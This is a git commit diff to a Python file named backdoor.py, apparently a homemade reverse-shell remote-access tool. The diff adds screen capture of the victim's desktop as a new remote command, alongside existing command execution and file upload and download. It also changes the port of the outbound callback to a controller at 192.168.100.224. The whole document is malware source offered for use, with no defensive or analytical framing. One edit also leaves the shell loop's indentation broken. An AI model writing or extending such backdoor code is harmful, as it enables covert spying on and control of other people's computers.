8f937a5ff8ca759c4975347727b3d47a035c343d
revolt36 <141328183+revolt36@users.noreply.github.com>
2023-08-07 23:30:27 +0400

    backdoor.py

--- backdoor.py
+++ backdoor.py
@@ -3,6 +3,7 @@ import time
 import subprocess
 import json
 import os
+import pyscreenshot
 
 def reliable_send(data):
         jsondata = json.dumps(data)
@@ -16,15 +17,26 @@ def reliable_recv():
                         return json.loads(data)
                 except ValueError:
                         continue
+def screenshot():
+    tamekran_ss = pyscreenshot.grab()
 
+    # Belgeseler klasörünün yolunu elde et
+    documents_path = os.path.expanduser("~/Documents")
 
+    # Dosya adını belirle
+    file_name = "last.png"
 
+    # Tam dosya yolu
+    full_file_path = os.path.join(documents_path, file_name)
 
+    # Ekran görüntüsünü kaydet
+    tamekran_ss.save(full_file_path)
+ 
 def connection():
     while True:
         time.sleep(20)
         try:
-            s.connect(('192.168.100.224',3131))
+            s.connect(('192.168.100.224',6060))
             shell()
             s.close()
             break
@@ -51,7 +63,7 @@ def download_file(file_name):
 
 
 def shell():
-    while True:
+      while True:
         command = reliable_recv()
         if command == 'quit':
             break
@@ -59,6 +71,8 @@ def shell():
             pass
         elif command[:3] == 'cd ':
             os.chdir(command[3:])
+        elif command == 'screenshot':
+            screenshot()
         elif command[:8] == 'download':
             upload_file(command[9:])
         elif command[:6] == 'upload':
